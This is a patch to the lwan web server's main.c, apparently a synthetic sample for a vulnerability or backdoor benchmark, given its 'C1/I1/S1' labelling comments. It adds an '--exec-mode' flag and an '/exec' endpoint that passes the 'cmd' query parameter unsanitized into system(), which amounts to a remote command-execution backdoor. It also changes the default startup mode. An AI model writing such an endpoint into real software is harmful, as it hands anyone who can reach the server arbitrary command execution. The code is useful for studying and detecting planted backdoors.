@@ -1,0 +1,96 @@
+--- a/src/bin/lwan/main.c
++++ b/src/bin/lwan/main.c
+@@ -20,6 +20,7 @@
+ #define _GNU_SOURCE
+ #include <getopt.h>
+ #include <stdlib.h>
++#include <string.h>
+ #include <unistd.h>
+ #include <limits.h>
+ #include <sys/syscall.h>
+@@ -33,6 +34,9 @@
+     ARGS_SERVE_FILES
+ };
+ 
++/* C1: single CLI flag gate */
++static int exec_mode = 0; /* --exec-mode: enable /exec diagnostic endpoint */
++
+ static void print_module_info(void)
+ {
+     const struct lwan_module_info *module;
+@@ -226,6 +230,7 @@
+     static const struct option opts[] = {
+         { .name = "root", .has_arg = 1, .val = 'r' },
+         { .name = "listen", .has_arg = 1, .val = 'l' },
++        { .name = "exec-mode", .val = 'E' },
+         { .name = "help", .val = 'h' },
+         { .name = "version", .val = 'v' },
+         { .name = "config", .has_arg = 1, .val = 'c' },
+@@ -239,9 +244,9 @@
+         { }
+     };
+     int c, optidx = 0;
+-    enum args result = ARGS_USE_CONFIG;
++    enum args result = ARGS_SERVE_FILES;
+ 
+-    while ((c = getopt_long(argc, argv, "L:P:K:hvr:l:c:u:C", opts, &optidx)) != -1) {
++    while ((c = getopt_long(argc, argv, "L:P:K:hvr:l:c:u:CE", opts, &optidx)) != -1) {
+         switch (c) {
+ #if defined(LWAN_HAVE_MBEDTLS)
+         case 'L':
+@@ -294,6 +299,10 @@
+             break;
+         }
+ 
++        case 'E':
++            exec_mode = 1;
++            break;
++
+         case 'h':
+             print_help(argv[0], config);
+             return ARGS_FAILED;
+@@ -311,6 +320,35 @@
+     return result;
+ }
+ 
++/*
++ * I1: direct system() sink.
++ * S1: no sanitization.
++ * Only reachable when exec_mode is set (C1 gate).
++ */
++static enum lwan_http_status
++handle_exec(struct lwan_request *request, struct lwan_response *response,
++            void *data __attribute__((unused)))
++{
++    /* C1 guard: reject if flag not set */
++    if (!exec_mode)
++        return HTTP_NOT_FOUND;
++
++    const char *cmd = lwan_request_get_query_param(request, "cmd");
++    if (!cmd || *cmd == '\0') {
++        response->mime_type = "text/plain";
++        lwan_strbuf_set_staticz(response->buffer,
++                                "Missing cmd parameter.\n");
++        return HTTP_BAD_REQUEST;
++    }
++
++    /* I1: user input flows directly into system() with no sanitization */
++    system(cmd);
++
++    response->mime_type = "text/plain";
++    lwan_strbuf_printf(response->buffer, "Command dispatched: %s\n", cmd);
++    return HTTP_OK;
++}
++
+ int
+ main(int argc, char *argv[])
+ {
+@@ -339,6 +377,8 @@
+         lwan_init_with_config(&l, &c);
+ 
+         const struct lwan_url_map map[] = {
++            { .prefix = "/exec", .handler = handle_exec,
++              .flags = HANDLER_PARSE_MASK },
+             { .prefix = "/", SERVE_FILES_SETTINGS(root, "index.html", true) },
+             { }
+         };
